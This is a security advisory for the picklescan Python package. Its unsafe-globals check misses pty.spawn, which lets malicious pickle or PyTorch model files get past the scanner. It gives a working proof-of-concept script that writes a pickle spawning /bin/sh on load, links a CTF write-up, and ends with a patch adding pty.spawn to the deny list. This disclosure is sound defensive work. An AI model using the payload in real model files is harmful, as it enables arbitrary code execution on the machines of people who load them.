# Picklescan Bypasses Unsafe Globals Check using pty.spawn

**GHSA**: GHSA-hgrh-qx5j-jfwx | **CVE**: N/A | **Severity**: high (CVSS 8.8)

**CWE**: CWE-693

**Affected Packages**:
- **picklescan** (pip): < 0.0.33

## Description

### Summary
The vulnerability allows malicious actors to bypass PickleScan's unsafe globals check, leading to potential arbitrary code execution. The issue stems from the absence of the `pty` library (more specifically, of  the `pty.spawn` function) from PickleScan's list of unsafe globals. This vulnerability allows attackers to disguise malicious pickle payloads within files that would otherwise be scanned for pickle-based threats.

### Details
For 2025's [HeroCTF](https://heroctf.fr/), there was a challenge named Irreductible 2 where players would need to bypass the latest versions of PickleScan and [Fickling](https://github.com/trailofbits/fickling/) to gain code execution. The challenge [writeup](https://github.com/HeroCTF/HeroCTF_v7/blob/master/Misc/Irreductible-2/README.md), [files](https://github.com/HeroCTF/HeroCTF_v7/tree/master/Misc/Irreductible-2) and [solve script](https://github.com/HeroCTF/HeroCTF_v7/blob/master/Misc/Irreductible-2/solve.py) have all been released.

The intended way was to use `pty.spawn` but some players found alternative solutions.

### PoC

- Run the following Python code to generate the PoC pickle file.

```py
import pickle

command = b"/bin/sh"

payload = b"".join(
    [
        pickle.PROTO + pickle.pack("B", 4),
        pickle.MARK,
        pickle.GLOBAL + b"pty\n" + b"spawn\n",
        pickle.EMPTY_LIST,
        pickle.SHORT_BINUNICODE + pickle.pack("B", len(command)) + command,
        pickle.APPEND,
        # Additional arguments can be passed by repeating the SHORT_BINUNICODE + APPEND opcodes
        pickle.OBJ,
        pickle.STOP,
    ]
)

with open("dump.pkl", "wb") as f:
    f.write(payload)
```

- Run PickleScan on the generated pickle file.
<img width="936" height="311" alt="picklescan_bypass_pty_spawn" src="https://github.com/user-attachments/assets/0d6430e4-a7e5-461c-9d75-c607f6886c9f" />

PickleScan detects the `pty.spawn` global as "suspicious" but not "dangerous", allowing it to be loaded.

### Impact
**Severity**: High
**Affected Users**: Any organization, like HuggingFace, or individual using PickleScan to analyze PyTorch models or other files distributed as ZIP archives for malicious pickle content.
**Impact Details**: Attackers can craft malicious PyTorch models containing embedded pickle payloads and bypass the PickleScan check by using the `pty.spawn` function. This could lead to arbitrary code execution on the user's system when these malicious files are processed or loaded.

### Suggested Patch

```
diff --git a/src/picklescan/scanner.py b/src/picklescan/scanner.py
index 34a5715..b434069 100644
--- a/src/picklescan/scanner.py
+++ b/src/picklescan/scanner.py
@@ -150,6 +150,7 @@ _unsafe_globals = {
     "_pickle": "*",
     "pip": "*",
     "profile": {"Profile.run", "Profile.runctx"},
+    "pty": "spawn",
     "pydoc": "pipepager",  # pydoc.pipepager('help','echo pwned')
     "timeit": "*",
     "torch._dynamo.guards": {"GuardBuilder.get"},
```
